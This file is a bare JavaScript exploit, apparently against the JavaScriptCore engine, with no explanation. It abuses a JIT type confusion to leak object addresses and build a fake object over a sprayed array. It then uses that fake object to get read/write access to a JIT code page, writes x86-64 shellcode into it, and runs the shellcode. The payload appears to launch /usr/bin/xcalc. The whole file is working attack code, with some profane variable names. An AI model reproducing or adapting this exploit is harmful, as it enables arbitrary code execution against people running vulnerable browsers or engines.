let ab = new ArrayBuffer(8);
let farray = new Float64Array(ab);
let uarray = new Uint32Array(ab);

function f2i(f) {
         farray[0] = f;
         return [uarray[0],uarray[1]]
}

function i2f(lo,hi) {
         uarray[0] = lo;
         uarray[1] = hi;
         return farray[0];
}

function hex(lo,hi) {
   print('0x' + hi.toString(16) + lo.toString(16));
}

function jit() {
	let a = [1,2,3,4];
	a[0] = a[1];
	a[2] = a[3];
	for(let i = 0; i < 200; i++) {
		a[i] = i;
		if(i % 2 == 0) {
			a[i] = i+1;
		}
		else
			a[i] = i;
	}
	
	return a;
}


let o = [1.1, 2.2, 3.3];
o[0] = 11.1;
DebugPrint(o);
o.val = 5.5;

function DebugPrint(arg) {
	print(describe(arg));
}

function set(arg) {
	o[0] = arg;
	return o[0];
}

function get() {
	return o[0];
}

DebugPrint(o);

for(let i = 0; i < 200; i++)
	jit();

for(let i = 0; i < 50000; i++)
	set(1.1);

for(let i = 0; i < 50000; i++)
	get();


delete o.val;

let b = {cell: i2f(0x1000,0x01082107 - 0x10000), b: 0x424242, c: 0x434343};
o[0] = b;

b_addr = f2i(get());
if(b_addr[0] == 0) {
	print('b_addr[0] == 0');
}
else {
	let arr = [];	

	for(let i = 0; i < 7000; i++) {
		let fuck = [1.1, 2.2, 3.3];
		fuck.ptr = 9.9 //i2f(0x41414141,0x42424242);
		fuck['fuck' + i.toString()] = 4.4;
		arr.push(fuck);
	}
	b.b = arr[6224];

	hex(b_addr[0], b_addr[1]);
	
	o[0] = jit;
	jit_addr = f2i(get());
	hex(jit_addr[0], jit_addr[1]);
	set((i2f(b_addr[0] + 0x10,b_addr[1])));

	let fake = o[0];		
	
	fake[1] = i2f(jit_addr[0] + 0x18, jit_addr[1]);

	let jit_page = f2i(arr[6224][0]);
	print(jit_page);

	fake[1] = i2f(jit_page[0] + 0x18 - 0x10, jit_page[1]);
	jit_page = f2i(arr[6224][2]);
	
	fake[1] = i2f(jit_page[0] + 0x10, jit_page[1]);
	jit_page = f2i(arr[6224][0]);	

	fake[1] = i2f(jit_page[0], jit_page[1]);

	//let shellcode = [0xbb48c031, 0x91969dd1, 0xff978cd0, 0x53dbf748, 0x52995f54, 0xb05e5457, 0x50f3b];
	let shellcode = [];
	shellcode[0] = 0x90909090;
	shellcode[1] = 0x90909090;
	shellcode[2] = 0x782fb848;
	shellcode[3] = 0x636c6163;
	shellcode[4] = 0x48500000;
	shellcode[5] = 0x73752fb8;
	shellcode[6] = 0x69622f72;
	shellcode[7] = 0x8948506e;
	shellcode[8] = 0xc03148e7;
	shellcode[9] = 0x89485750;
	shellcode[10] = 0xd23148e6;
	shellcode[11] = 0x3ac0c748;
	shellcode[12] = 0x50000030;
	shellcode[13] = 0x4944b848;
	shellcode[14] = 0x414c5053;
	shellcode[15] = 0x48503d59;
	shellcode[16] = 0x3148e289;
	shellcode[17] = 0x485250c0;
	shellcode[18] = 0xc748e289;
	shellcode[19] = 0x00003bc0;
	shellcode[20] = 0x050f00;

	let arr_idx = 0;
	
	for(let i = 0; i < shellcode.length; i+=2) {
		arr[6224][arr_idx] = i2f(shellcode[i], shellcode[i+1]);
		arr_idx++;
	}

	jit();
}
